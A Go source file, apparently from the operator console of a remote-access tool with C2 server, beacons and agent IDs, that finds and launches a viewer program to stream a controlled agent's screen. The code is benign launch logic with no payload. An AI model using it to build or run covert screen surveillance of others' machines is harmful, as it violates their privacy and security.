// viewer_launch.go — 拉起 viewer（远控程序）
//
// 说明：C2 把屏幕帧转发给"发起 0x1002 屏幕流请求的那条 ctl 连接"
// （server/cmd/c2server/beacon_stream.go 的 StreamRegistry 配对），
// 因此屏幕流必须由 viewer 自己的连接建立；ratctl 只负责启动 viewer 并透传参数。
package main

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
)

// viewerOverride 由 -viewer 指定（空 = 自动查找）。
var viewerOverride string

// findViewer 按优先级查找 viewer.exe：
// -viewer 指定 → ratctl 同目录 → 常见构建输出目录 → PATH。
func findViewer() (string, error) {
	if viewerOverride != "" {
		if fi, err := os.Stat(viewerOverride); err == nil && !fi.IsDir() {
			return viewerOverride, nil
		}
		return "", fmt.Errorf("viewer 不存在：%s", viewerOverride)
	}
	var cands []string
	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		cands = append(cands,
			filepath.Join(dir, "viewer.exe"),
			filepath.Join(dir, "..", "viewer", "viewer.exe"),
			// cmake -S viewer -B viewer/build   →  viewer/build/bin/viewer.exe
			filepath.Join(dir, "..", "..", "viewer", "build", "bin", "viewer.exe"),
			filepath.Join(dir, "..", "..", "viewer", "build", "viewer.exe"),
			// cmake -S viewer -B build/viewer   →  build/viewer/bin/viewer.exe
			filepath.Join(dir, "..", "..", "build", "viewer", "bin", "viewer.exe"),
			filepath.Join(dir, "..", "..", "build", "viewer", "Debug", "viewer.exe"),
		)
	}
	cands = append(cands,
		filepath.Join("viewer", "build", "bin", "viewer.exe"),
		filepath.Join("viewer", "build", "viewer.exe"),
		filepath.Join("build", "viewer", "bin", "viewer.exe"),
		filepath.Join("build", "viewer", "Debug", "viewer.exe"),
	)
	for _, c := range cands {
		if fi, err := os.Stat(c); err == nil && !fi.IsDir() {
			return c, nil
		}
	}
	if p, err := exec.LookPath("viewer.exe"); err == nil {
		return p, nil
	}
	return "", errors.New("未找到 viewer.exe（用 ratctl -viewer <path> 指定，或先构建 viewer）")
}

// launchViewer 启动 viewer 进程（不阻塞 REPL）。
func (st *shellState) launchViewer(agentID string, fps, quality, scale int) error {
	exe, err := findViewer()
	if err != nil {
		return err
	}
	args := []string{
		"-s", st.addr,
		"-a", agentID,
		"-fps", strconv.Itoa(fps),
		"-quality", strconv.Itoa(quality),
		"-scale", strconv.Itoa(scale),
	}
	cmd := exec.Command(exe, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("启动 viewer 失败：%w", err)
	}
	fmt.Printf("[*] viewer pid=%d exe=%s\n", cmd.Process.Pid, exe)
	go func() { _ = cmd.Wait() }() // 回收子进程
	return nil
}
